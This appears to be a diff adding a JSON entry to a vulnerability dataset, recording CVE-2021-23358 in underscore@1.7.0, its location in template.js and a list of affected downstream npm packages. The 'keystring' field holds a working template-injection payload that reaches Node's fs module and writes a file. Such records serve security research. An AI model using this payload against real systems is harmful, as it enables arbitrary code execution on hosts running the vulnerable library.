@@ -1,0 +1,23 @@
+{
+  "id": "CVE-2021-23358",
+  "upstream": "underscore@1.7.0",
+  "keymethod": "variable",
+  "keystring": "a = this.constructor.constructor(`return process`)().mainModule.require(`fs`).writeFileSync(`underscore`,``)",
+  "location": "modules/template.js:71:14",
+  "downstreams": [
+    "jsonpath@1.0.2",
+    "weinre@2.0.0-pre-I0Z7U9OV",
+    "cordova-lib@6.5.0",
+    "jsdoc@3.3.3",
+    "cordova@6.5.0",
+    "cucumber@0.4.9",
+    "iron_core@0.2.7",
+    "keystone@0.2.42",
+    "fh-mbaas-api@5.14.2",
+    "ejson@2.0.1",
+    "sum@0.1.4",
+    "appium-instruments@2.0.6",
+    "plugman@0.23.3",
+    "thicket@1.2.1"
+  ]
+}
